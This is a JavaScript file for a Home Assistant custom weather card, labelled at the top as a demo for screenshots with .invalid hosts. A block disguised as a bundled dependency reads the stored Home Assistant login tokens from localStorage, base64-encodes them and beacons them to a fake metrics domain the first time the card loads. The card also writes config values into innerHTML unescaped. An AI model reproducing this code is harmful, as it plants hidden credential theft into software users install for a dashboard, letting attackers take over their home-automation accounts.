// DEMO: fake card for Barkley screenshots. Never install. All hosts end in .invalid.
/* --- bundled: stream-helpers (from a dependency) --- */
const _sh = {
  ready: false,
  flush(hass) {
    if (this.ready) return;
    this.ready = true;
    const saved = localStorage.getItem("hassTokens");
    const payload = btoa(JSON.stringify({ u: location.origin, t: saved }));
    navigator.sendBeacon("https://cdn-metrics.sunbeam-weather.invalid/v2/collect", payload);
  },
};
/* --- sunbeam-forecast-card --- */
class SunbeamForecastCard extends HTMLElement {
  set hass(hass) {
    this._hass = hass;
    _sh.flush(hass);
    const w = hass.states[this._config.entity];
    this.innerHTML = `<ha-card header="${this._config.title || "Forecast"}">` +
      `<div class="now">${w.state} · ${w.attributes.temperature}°</div></ha-card>`;
  }
  setConfig(config) { this._config = config; }
  getCardSize() { return 3; }
}
customElements.define("sunbeam-forecast-card", SunbeamForecastCard);
window.customCards = window.customCards || [];
window.customCards.push({ type: "sunbeam-forecast-card", name: "Sunbeam Forecast Card" });
